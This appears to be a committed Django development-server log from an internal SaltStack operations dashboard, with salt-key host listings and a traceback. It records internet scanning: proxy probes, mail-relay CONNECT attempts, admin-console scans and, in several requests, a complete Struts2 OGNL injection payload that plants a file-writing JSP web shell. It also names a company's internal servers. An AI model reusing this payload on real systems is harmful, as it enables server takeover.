@@ -1,0 +1,5505 @@
+/usr/local/python2.7/lib/python2.7/site-packages/django/template/loader.py:97: RemovedInDjango110Warning: render() must be called with a dict, not a RequestContext.
+  return template.render(context, request)
+
+[20/May/2016 16:35:14] "GET / HTTP/1.1" 200 3204
+[20/May/2016 16:35:15] "GET /static/css/form-elements.css HTTP/1.1" 200 2508
+[20/May/2016 16:35:15] "GET /static/css/style.css HTTP/1.1" 200 3639
+[20/May/2016 16:35:15] "GET /static/bootstrap/js/bootstrap.min.js HTTP/1.1" 200 35951
+[20/May/2016 16:35:15] "GET /static/font-awesome/css/font-awesome.min.css HTTP/1.1" 200 21984
+[20/May/2016 16:35:15] "GET /static/js/jquery.backstretch.min.js HTTP/1.1" 200 4233
+[20/May/2016 16:35:15] "GET /static/js/scripts.js HTTP/1.1" 200 710
+[20/May/2016 16:35:15] "GET /static/bootstrap/css/bootstrap.min.css HTTP/1.1" 200 117305
+[20/May/2016 16:35:15] "GET /static/js/jquery-1.11.1.min.js HTTP/1.1" 200 95786
+[20/May/2016 16:35:15] "GET /static/ico/favicon.png HTTP/1.1" 200 459
+[20/May/2016 16:35:15] "GET /static/font-awesome/fonts/fontawesome-webfont.woff?v=4.2.0 HTTP/1.1" 200 71508
+[20/May/2016 16:35:15] "GET /static/img/backgrounds/1.jpg HTTP/1.1" 200 170790
+[20/May/2016 16:36:28] "POST / HTTP/1.1" 200 3256
+[20/May/2016 16:36:36] "POST / HTTP/1.1" 302 0
+[20/May/2016 16:36:36] "GET /index/ HTTP/1.1" 200 9210
+[20/May/2016 16:36:37] "GET /static/css/sb-admin.css HTTP/1.1" 200 3480
+[20/May/2016 16:36:37] "GET /static/js/jquery.js HTTP/1.1" 200 95785
+[20/May/2016 16:36:37] "GET /static/js/echarts.js HTTP/1.1" 200 296800
+[20/May/2016 16:36:37] "GET /static/img/meitianhui.png HTTP/1.1" 200 7082
+Not Found: /favicon.ico
+[20/May/2016 16:36:37] "GET /favicon.ico HTTP/1.1" 404 2640
+Not Found: /favicon.ico
+[20/May/2016 16:36:37] "GET /favicon.ico HTTP/1.1" 404 2640
+[20/May/2016 16:36:41] "GET /asset/asset/overview HTTP/1.1" 200 8725
+[20/May/2016 16:36:44] "GET /saltstack/hosts/deploy/application HTTP/1.1" 200 9610
+[20/May/2016 16:36:44] "GET /static/img/wait.gif HTTP/1.1" 200 54292
+[20/May/2016 16:36:49] "POST /saltstack/hosts/deploy/application HTTP/1.1" 403 84
+[20/May/2016 16:37:04] "GET /saltstack/hosts/deploy/application HTTP/1.1" 200 9610
+[20/May/2016 16:37:10] "GET /saltstack/hosts/host_info HTTP/1.1" 200 9745
+[20/May/2016 16:37:12] "GET /saltstack/hosts/host_info?page=2 HTTP/1.1" 200 9234
+[20/May/2016 16:37:17] "GET /saltstack/hosts/host_info?page=1 HTTP/1.1" 200 9745
+[20/May/2016 16:37:19] "GET /saltstack/hosts/host_info?page=2 HTTP/1.1" 200 9234
+[20/May/2016 16:37:20] "GET /saltstack/hosts/host_info?page=1 HTTP/1.1" 200 9745
+[20/May/2016 16:37:21] "GET /saltstack/hosts/host_info?page=2 HTTP/1.1" 200 9234
+[20/May/2016 16:37:22] "GET /saltstack/hosts/host_info?page=1 HTTP/1.1" 200 9745
+[20/May/2016 16:37:23] "GET /saltstack/hosts/host_info?page=2 HTTP/1.1" 200 9234
+[20/May/2016 16:37:23] "GET /saltstack/hosts/host_info?page=1 HTTP/1.1" 200 9745
+[20/May/2016 16:37:25] "GET /saltstack/hosts/refresh_host_info HTTP/1.1" 302 0
+[20/May/2016 16:37:25] "GET /saltstack/hosts/host_info HTTP/1.1" 200 9745
+[20/May/2016 16:37:29] "GET /asset/asset/overview HTTP/1.1" 200 8725
+[20/May/2016 16:38:33] "GET /asset/asset/overview HTTP/1.1" 200 8598
+[20/May/2016 16:38:33] "GET /static/bootstrap/css/bootstrap.min.css HTTP/1.1" 304 0
+[20/May/2016 16:38:33] "GET /static/css/sb-admin.css HTTP/1.1" 304 0
+[20/May/2016 16:38:33] "GET /static/js/jquery.js HTTP/1.1" 304 0
+[20/May/2016 16:38:33] "GET /static/font-awesome/css/font-awesome.min.css HTTP/1.1" 304 0
+[20/May/2016 16:38:33] "GET /static/bootstrap/js/bootstrap.min.js HTTP/1.1" 304 0
+[20/May/2016 16:38:33] "GET /static/js/echarts.js HTTP/1.1" 304 0
+[20/May/2016 16:38:33] "GET /static/img/meitianhui.png HTTP/1.1" 304 0
+[20/May/2016 16:38:35] "GET /saltstack/hosts/host_info HTTP/1.1" 200 9618
+[20/May/2016 16:38:45] "GET /deploy-manage/add_svn_repo/ HTTP/1.1" 200 9577
+[20/May/2016 16:42:10] "GET /logout/ HTTP/1.1" 302 0
+[20/May/2016 16:42:10] "GET / HTTP/1.1" 200 3204
+[20/May/2016 16:42:18] "POST / HTTP/1.1" 302 0
+[20/May/2016 16:42:19] "GET /index/ HTTP/1.1" 200 9338
+[20/May/2016 16:42:35] "GET /saltstack/hosts/cmd_run HTTP/1.1" 200 9511
+[20/May/2016 16:42:56] "POST /saltstack/hosts/cmd_run HTTP/1.1" 200 9719
+[20/May/2016 16:43:23] "GET /saltstack/hosts/list_cmd_run_info HTTP/1.1" 200 6588
+[20/May/2016 16:43:25] "GET /saltstack/hosts/deploy/application HTTP/1.1" 200 9738
+[20/May/2016 16:53:35] "GET / HTTP/1.1" 200 3204
+[20/May/2016 16:53:35] "GET / HTTP/1.1" 200 3204
+[20/May/2016 16:53:40] "GET / HTTP/1.1" 200 3204
+[20/May/2016 16:53:40] "GET /static/css/style.css HTTP/1.1" 200 3639
+[20/May/2016 16:53:40] "GET /static/css/form-elements.css HTTP/1.1" 200 2508
+[20/May/2016 16:53:40] "GET /static/font-awesome/css/font-awesome.min.css HTTP/1.1" 200 21984
+[20/May/2016 16:53:40] "GET /static/bootstrap/css/bootstrap.min.css HTTP/1.1" 200 117305
+[20/May/2016 16:53:41] "GET /static/bootstrap/js/bootstrap.min.js HTTP/1.1" 200 35951
+[20/May/2016 16:53:41] "GET /static/js/jquery.backstretch.min.js HTTP/1.1" 200 4233
+[20/May/2016 16:53:41] "GET /static/js/jquery-1.11.1.min.js HTTP/1.1" 200 95786
+[20/May/2016 16:53:41] "GET /static/js/scripts.js HTTP/1.1" 200 710
+[20/May/2016 16:53:41] "GET /static/font-awesome/fonts/fontawesome-webfont.woff?v=4.2.0 HTTP/1.1" 200 71508
+[20/May/2016 16:53:45] "GET /static/img/backgrounds/1.jpg HTTP/1.1" 200 170790
+[20/May/2016 16:53:45] "GET /static/ico/favicon.png HTTP/1.1" 200 459
+[20/May/2016 16:54:42] "GET / HTTP/1.1" 302 0
+Performing system checks...
+
+System check identified no issues (0 silenced).
+May 20, 2016 - 16:35:02
+Django version 1.9.5, using settings 'ops_system.settings'
+Starting development server at http://0.0.0.0:8080/
+Quit the server with CONTROL-C.
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+No minions matched the target. No command was sent, no jid was assigned.
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- port[20/May/2016 16:54:43] "GET /index/ HTTP/1.1" 200 9338
+[20/May/2016 16:54:56] "POST / HTTP/1.1" 302 0
+[20/May/2016 16:54:57] "GET /index/ HTTP/1.1" 200 9083
+[20/May/2016 16:54:57] "GET /static/css/sb-admin.css HTTP/1.1" 200 3480
+[20/May/2016 16:54:57] "GET /static/img/meitianhui.png HTTP/1.1" 200 7082
+[20/May/2016 16:54:57] "GET /static/js/jquery.js HTTP/1.1" 200 95785
+[20/May/2016 16:54:57] "GET /static/js/echarts.js HTTP/1.1" 200 296800
+Not Found: /favicon.ico
+[20/May/2016 16:54:58] "GET /favicon.ico HTTP/1.1" 404 2640
+[20/May/2016 16:55:44] "GET /deploy-manage/list_repo_info/ HTTP/1.1" 200 6199
+[20/May/2016 16:55:49] "GET /deploy-manage/list_deploy_info/ HTTP/1.1" 200 6273
+[20/May/2016 16:56:13] "GET /deploy-manage/list_repo_info/ HTTP/1.1" 200 6199
+[20/May/2016 16:56:16] "GET /saltstack/hosts/list_app_deploy_info HTTP/1.1" 200 6398
+[20/May/2016 16:56:19] "GET /saltstack/hosts/list_cmd_run_info HTTP/1.1" 200 6333
+[20/May/2016 16:56:26] "GET /saltstack/hosts/host_info HTTP/1.1" 200 9618
+[20/May/2016 16:59:52] "GET /static/js/jquery.backstretch.min.js HTTP/1.1" 200 4233
+[20/May/2016 16:59:52] "GET /static/js/scripts.js HTTP/1.1" 200 710
+[20/May/2016 16:59:52] "GET /static/bootstrap/js/bootstrap.min.js HTTP/1.1" 200 35951
+[20/May/2016 16:59:52] "GET /static/js/jquery-1.11.1.min.js HTTP/1.1" 200 95786
+[20/May/2016 17:01:15] "GET /deploy-manage/list_deploy_info/ HTTP/1.1" 200 6273
+[20/May/2016 17:01:22] "GET /deploy-manage/add_git_repo/ HTTP/1.1" 200 8973
+[20/May/2016 17:01:25] "GET /deploy-manage/list_repo_info/ HTTP/1.1" 200 6199
+Not Found: /http:/zc.qq.com/cgi-bin/common/attr
+[20/May/2016 17:21:35] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.7280222487883380 HTTP/1.1" 404 1736
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[20/May/2016 17:42:40] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1729
+Not Found: /script
+[20/May/2016 17:53:10] "GET /script HTTP/1.1" 404 2623
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[20/May/2016 18:07:36] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1729
+Not Found: /http:/www.sogou.com/
+[20/May/2016 18:51:15] "GET http://www.sogou.com/?rands=_2036358828820140562322396 HTTP/1.1" 404 1693
+Not Found: /http:/www.haosou.com/
+[20/May/2016 18:51:15] "GET http://www.haosou.com/?rands=_160803619282255612283924 HTTP/1.1" 404 1696
+Not Found: /http:/m.baidu.com/
+[20/May/2016 18:51:24] "GET http://m.baidu.com/?rands=_85896639042223001590656 HTTP/1.1" 404 1683
+Not Found: /http:/www.kuaidaili.com/
+[20/May/2016 18:51:24] "GET http://www.kuaidaili.com/?rands=_1318291520217352655576 HTTP/1.1" 404 1706
+[20/May/2016 19:11:38] "GET / HTTP/1.1" 302 0
+[20/May/2016 19:11:39] "GET /index/ HTTP/1.1" 200 9338
+Not Found: /favicon.ico
+Not Found: /favicon.ico
+[20/May/2016 19:11:39] "GET /favicon.ico HTTP/1.1" 404 2640
+[20/May/2016 19:11:39] "GET /favicon.ico HTTP/1.1" 404 2640
+[20/May/2016 19:11:43] "GET /saltstack/hosts/host_info HTTP/1.1" 200 9873
+[20/May/2016 19:11:45] "GET /saltstack/hosts/host_info?page=2 HTTP/1.1" 200 9362
+[20/May/2016 19:11:49] "GET /saltstack/hosts/host_info?page=1 HTTP/1.1" 200 9873
+[20/May/2016 19:11:54] "GET /saltstack/hosts/cmd_run HTTP/1.1" 200 9511
+[20/May/2016 19:12:17] "POST /saltstack/hosts/cmd_run HTTP/1.1" 200 16743
+[20/May/2016 19:12:29] "GET /saltstack/hosts/list_cmd_run_info HTTP/1.1" 200 6845
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[20/May/2016 19:23:59] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1729
+Not Found: /163mx03.mxmail.netease.com:25
+[20/May/2016 20:41:11] "CONNECT 163mx03.mxmail.netease.com:25 HTTP/1.0" 404 1692
+Not Found: /http:/www.sogou.com/
+[20/May/2016 22:30:02] "GET http://www.sogou.com/?rands=_1531895241612681002762880 HTTP/1.1" 404 1693
+Not Found: /http:/www.haosou.com/
+[20/May/2016 22:30:05] "GET http://www.haosou.com/?rands=_189781437608524263235472 HTTP/1.1" 404 1696
+Not Found: /http:/reg.renren.com/
+[20/May/2016 22:30:19] "GET http://reg.renren.com/?rands=_125167127427050883788232 HTTP/1.1" 404 1696
+Not Found: /http:/m.baidu.com/
+[20/May/2016 22:30:19] "GET http://m.baidu.com/?rands=_1882883991418745565540636 HTTP/1.1" 404 1685
+Not Found: /http:/www.kuaidaili.com/
+[20/May/2016 22:30:19] "GET http://www.kuaidaili.com/?rands=_187762333002979721549260 HTTP/1.1" 404 1708
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[20/May/2016 23:27:56] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1729
+Not Found: /index.do
+[20/May/2016 23:31:06] "GET /index.do?redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.getWriter().println(%22okokok%22),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22lndex.jsp%22)).append(%23req.getParameter(%22shell%22)).close()}&shell=%3C%25if(request.getParameter(%22f%22)!%3Dnull)(new%20java.io.FileOutputStream(application.getRealPath(%22%2F%22)%2Brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3B%25%3E%3Ca%20href%3D%22One_OK%22%3E%3C%2Fa%3E HTTP/1.1" 404 3320
+Not Found: /admin/index.action
+[20/May/2016 23:31:07] "GET /admin/index.action?redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.getWriter().println(%22okokok%22),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22lndex.jsp%22)).append(%23req.getParameter(%22shell%22)).close()}&shell=%3C%25if(request.getParameter(%22f%22)!%3Dnull)(new%20java.io.FileOutputStream(application.getRealPath(%22%2F%22)%2Brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3B%25%3E%3Ca%20href%3D%22One_OK%22%3E%3C%2Fa%3E HTTP/1.1" 404 5111
+Not Found: /index.action
+[20/May/2016 23:31:09] "GET /index.action?redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.getWriter().println(%22okokok%22),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22lndex.jsp%22)).append(%23req.getParameter(%22shell%22)).close()}&shell=%3C%25if(request.getParameter(%22f%22)!%3Dnull)(new%20java.io.FileOutputStream(application.getRealPath(%22%2F%22)%2Brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3B%25%3E%3Ca%20href%3D%22One_OK%22%3E%3C%2Fa%3E HTTP/1.1" 404 3332
+Not Found: /login.action
+[20/May/2016 23:31:09] "GET /login.action?redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.getWriter().println(%22okokok%22),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22lndex.jsp%22)).append(%23req.getParameter(%22shell%22)).close()}&shell=%3C%25if(request.getParameter(%22f%22)!%3Dnull)(new%20java.io.FileOutputStream(application.getRealPath(%22%2F%22)%2Brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3B%25%3E%3Ca%20href%3D%22One_OK%22%3E%3C%2Fa%3E HTTP/1.1" 404 3332
+Not Found: /admin/loginAction.action
+[20/May/2016 23:31:09] "GET /admin/loginAction.action?redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.getWriter().println(%22okokok%22),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22lndex.jsp%22)).append(%23req.getParameter(%22shell%22)).close()}&shell=%3C%25if(request.getParameter(%22f%22)!%3Dnull)(new%20java.io.FileOutputStream(application.getRealPath(%22%2F%22)%2Brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3B%25%3E%3Ca%20href%3D%22One_OK%22%3E%3C%2Fa%3E HTTP/1.1" 404 5129
+Not Found: /login/Jeecms.do
+[20/May/2016 23:31:10] "GET /login/Jeecms.do?redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.getWriter().println(%22okokok%22),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22lndex.jsp%22)).append(%23req.getParameter(%22shell%22)).close()}&shell=%3C%25if(request.getParameter(%22f%22)!%3Dnull)(new%20java.io.FileOutputStream(application.getRealPath(%22%2F%22)%2Brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3B%25%3E%3Ca%20href%3D%22One_OK%22%3E%3C%2Fa%3E HTTP/1.1" 404 3341
+Not Found: /loginAction.action
+[20/May/2016 23:31:12] "GET /loginAction.action?redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23res.getWriter().println(%22okokok%22),%23res.getWriter().flush(),%23res.getWriter().close(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22lndex.jsp%22)).append(%23req.getParameter(%22shell%22)).close()}&shell=%3C%25if(request.getParameter(%22f%22)!%3Dnull)(new%20java.io.FileOutputStream(application.getRealPath(%22%2F%22)%2Brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3B%25%3E%3Ca%20href%3D%22One_OK%22%3E%3C%2Fa%3E HTTP/1.1" 404 3350
+Not Found: /http:/www.google.com/reader/about/
+[20/May/2016 23:48:29] "GET http://www.google.com/reader/about/ HTTP/1.1" 404 1703
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[21/May/2016 00:38:57] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1729
+Not Found: /http:/zc.qq.com/cgi-bin/common/attr
+[21/May/2016 01:50:05] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.5547834472745666 HTTP/1.1" 404 1736
+Not Found: /vip163mx01.mxmail.netease.com:25
+[21/May/2016 01:53:48] "CONNECT vip163mx01.mxmail.netease.com:25 HTTP/1.0" 404 1701
+Not Found: /http:/www.sogou.com/
+[21/May/2016 02:11:23] "GET http://www.sogou.com/?rands=_408610130195544847864 HTTP/1.1" 404 1689
+Not Found: /http:/www.haosou.com/
+[21/May/2016 02:11:23] "GET http://www.haosou.com/?rands=_2864499480198855182920 HTTP/1.1" 404 1694
+Not Found: /http:/reg.renren.com/
+[21/May/2016 02:11:25] "GET http://reg.renren.com/?rands=_245288656412938641218928 HTTP/1.1" 404 1696
+Not Found: /http:/m.baidu.com/
+[21/May/2016 02:11:25] "GET http://m.baidu.com/?rands=_16793486438237978063024 HTTP/1.1" 404 1683
+Not Found: /http:/www.kuaidaili.com/
+[21/May/2016 02:11:28] "GET http://www.kuaidaili.com/?rands=_1964946310426240764123236 HTTP/1.1" 404 1709
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[21/May/2016 03:27:47] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1729
+Not Found: /http:/www.google.com/reader/about/
+[21/May/2016 03:44:58] "GET http://www.google.com/reader/about/ HTTP/1.1" 404 1703
+Traceback (most recent call last):
+  File "/usr/local/python2.7/lib/python2.7/wsgiref/handlers.py", line 86, in run
+    self.finish_response()
+  File "/usr/local/python2.7/lib/python2.7/wsgiref/handlers.py", line 128, in finish_response
+    self.write(data)
+  File "/usr/local/python2.7/lib/python2.7/wsgiref/handlers.py", line 212, in write
+    self.send_headers()
+  File "/usr/local/python2.7/lib/python2.7/wsgiref/handlers.py", line 270, in send_headers
+    self.send_preamble()
+  File "/usr/local/python2.7/lib/python2.7/wsgiref/handlers.py", line 191, in send_preamble
+    self._write('HTTP/%s %s\r\n' % (self.http_version,self.status))
+  File "/usr/local/python2.7/lib/python2.7/wsgiref/handlers.py", line 391, in _write
+    self.stdout.write(data)
+  File "/usr/local/python2.7/lib/python2.7/socket.py", line 328, in write
+    self.flush()
+  File "/usr/local/python2.7/lib/python2.7/socket.py", line 307, in flush
+    self._sock.sendall(view[write_offset:write_offset+buffer_size])
+error: [Errno 104] Connection reset by peer
+[21/May/2016 03:44:58] "GET http://www.google.com/reader/about/ HTTP/1.1" 500 59
+- Broken pipe from ('91.236.75.4', 56803)
+Not Found: /http:/115.239.210.27/
+[21/May/2016 03:51:52] "GET http://115.239.210.27/ HTTP/1.1" 404 1664
+Not Found: /http:/zc.qq.com/cgi-bin/common/attr
+[21/May/2016 04:14:52] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.9013687179764998 HTTP/1.1" 404 1736
+Not Found: /http:/clientapi.ipip.net/echo.php
+[21/May/2016 04:56:59] "GET http://clientapi.ipip.net/echo.php?info=20160521045658 HTTP/1.1" 404 1724
+[21/May/2016 04:57:07] code 400, message Bad request syntax ('SSH-2.0-LYGhost_1.2.7-20100630')
+[21/May/2016 04:57:07] "SSH-2.0-LYGhost_1.2.7-20100630" 400 -
+[21/May/2016 04:57:18] code 400, message Bad request syntax ('\x00\x9c\x00\x01\x1a+<M\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00')
+[21/May/2016 04:57:18] 
+Not Found: /http:/zc.qq.com/cgi-bin/common/attr
+[21/May/2016 05:27:23] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.8841608814496582 HTTP/1.1" 404 1736
+Not Found: /http:/www.sogou.com/
+[21/May/2016 05:51:32] "GET http://www.sogou.com/?rands=_23990768060341101885648 HTTP/1.1" 404 1691
+Not Found: /http:/www.haosou.com/
+[21/May/2016 05:51:32] "GET http://www.haosou.com/?rands=_16236264348151206201872 HTTP/1.1" 404 1695
+Not Found: /http:/reg.renren.com/
+[21/May/2016 05:51:32] "GET http://reg.renren.com/?rands=_2143412174821405890440700 HTTP/1.1" 404 1697
+Not Found: /http:/m.baidu.com/
+[21/May/2016 05:51:33] "GET http://m.baidu.com/?rands=_158151341767783023123904 HTTP/1.1" 404 1684
+Not Found: /http:/www.kuaidaili.com/
+[21/May/2016 05:51:37] "GET http://www.kuaidaili.com/?rands=_244816537611078401565872 HTTP/1.1" 404 1708
+[21/May/2016 06:25:37] code 400, message Bad request syntax ('JDWP-Handshake')
+[21/May/2016 06:25:37] "JDWP-Handshake" 400 -
+Not Found: /zabbix/
+[21/May/2016 06:25:47] "GET /zabbix/ HTTP/1.1" 404 2626
+Not Found: /console/
+[21/May/2016 06:29:01] "GET /console/ HTTP/1.1" 404 2629
+Not Found: /index.html
+[21/May/2016 06:29:53] "GET /index.html HTTP/1.1" 404 2635
+[21/May/2016 06:31:21] "GET / HTTP/1.1" 200 3204
+Not Found: /jenkins/
+[21/May/2016 06:31:28] "GET /jenkins/ HTTP/1.1" 404 2629
+Not Found: /cacti/index.php
+[21/May/2016 06:31:33] "GET /cacti/index.php HTTP/1.1" 404 2650
+Not Found: /index.php
+[21/May/2016 06:31:36] "GET /index.php HTTP/1.1" 404 2632
+[21/May/2016 06:31:44] "GET / HTTP/1.1" 200 3204
+Not Found: /axis2/
+[21/May/2016 06:31:45] "GET /axis2/ HTTP/1.1" 404 2623
+Not Found: /examples/servlets/index.html
+[21/May/2016 06:31:49] "GET /examples/servlets/index.html HTTP/1.1" 404 2689
+Not Found: /examples/jsp/index.html
+[21/May/2016 06:31:54] "GET /examples/jsp/index.html HTTP/1.1" 404 2674
+[21/May/2016 06:31:59] "GET / HTTP/1.1" 200 3204
+Not Found: /hudson/
+[21/May/2016 06:32:02] "GET /hudson/ HTTP/1.1" 404 2626
+[21/May/2016 06:32:08] "GET / HTTP/1.1" 200 3204
+Not Found: /solr/
+[21/May/2016 06:32:11] "GET /solr/ HTTP/1.1" 404 2620
+Not Found: /www/admin/index.php
+[21/May/2016 06:32:16] "GET /www/admin/index.php HTTP/1.1" 404 2662
+Not Found: /jmx-console/
+[21/May/2016 06:32:36] "GET /jmx-console/ HTTP/1.1" 404 2641
+Not Found: /web-console/
+[21/May/2016 06:32:39] "GET /web-console/ HTTP/1.1" 404 2641
+Not Found: /cgi-bin/authlogin.cgi
+[21/May/2016 06:32:45] "GET /cgi-bin/authlogin.cgi HTTP/1.1" 404 2668
+Not Found: /cgi-bin/it.cgi
+[21/May/2016 06:32:48] "GET /cgi-bin/it.cgi HTTP/1.1" 404 2647
+Not Found: /cgi-bin/test-cgi
+[21/May/2016 06:32:50] "GET /cgi-bin/test-cgi HTTP/1.1" 404 2653
+Not Found: /cgi-sys/defaultwebpage.cgi
+[21/May/2016 06:32:53] "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1" 404 2683
+Not Found: /cgi-sys/FormMail-clone.cgi
+[21/May/2016 06:32:57] "GET /cgi-sys/FormMail-clone.cgi HTTP/1.1" 404 2683
+[21/May/2016 06:33:09] "GET / HTTP/1.1" 200 3204
+Not Found: /j_acegi_security_check
+[21/May/2016 06:33:26] "GET /j_acegi_security_check HTTP/1.1" 404 2671
+Not Found: /axis2/axis2-admin/login
